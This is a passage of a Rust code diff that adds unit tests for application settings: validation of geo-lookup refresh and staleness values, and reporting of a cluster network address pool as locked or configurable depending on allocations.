+            refresh_interval_hours: Some(0),
+            ..temps_core::GeoSettings::default()
+        })
+        .expect_err("a zero interval would turn the job into a download loop");
+        assert_eq!(error.status_code, StatusCode::BAD_REQUEST);
+    }
+
+    #[test]
+    fn geo_validation_rejects_an_out_of_range_staleness_window() {
+        let error = validate_geo_settings(&temps_core::GeoSettings {
+            stale_lookup_days: Some(temps_core::MAX_GEO_STALE_LOOKUP_DAYS + 1),
+            ..temps_core::GeoSettings::default()
+        })
+        .expect_err("an absurd window must be reported, not silently clamped");
+        assert_eq!(error.status_code, StatusCode::BAD_REQUEST);
+    }
+
+    #[test]
     fn response_uses_active_timescale_policies_and_service_count() {
         let policies = EffectiveTelemetryPolicies {
             metrics_raw_days: Some(14),
@@ -2754,6 +4768,44 @@ mod tests {
         assert_eq!(response.observability_retention.otel_spans_days, 75);
         assert_eq!(response.observability_retention.otel_logs_days, 45);
         assert_eq!(response.observability_retention.otel_metrics_days, 60);
+    }
+
+    #[test]
+    fn response_exposes_cluster_pool_and_locks_it_after_allocation() {
+        let response = AppSettingsResponse::from(AppSettings::default())
+            .with_cluster_network_state(Some(crate::ClusterNetworkState {
+                compute_pool_cidr: "10.240.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 2,
+            }));
+
+        assert_eq!(
+            response.multi_node.cluster_network,
+            Some(ClusterNetworkSettings {
+                compute_pool_cidr: "10.240.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 2,
+                locked: true,
+            })
+        );
+    }
+
+    #[test]
+    fn response_marks_an_unused_cluster_pool_as_configurable() {
+        let response = AppSettingsResponse::from(AppSettings::default())
+            .with_cluster_network_state(Some(crate::ClusterNetworkState {
+                compute_pool_cidr: "172.20.0.0/16".to_string(),
+                subnet_prefix_len: 24,
+                allocation_count: 0,
+            }));
+
+        assert!(
+            !response
+                .multi_node
+                .cluster_network
+                .expect("cluster network state")
+                .locked
+        );
     }
 
     #[test]
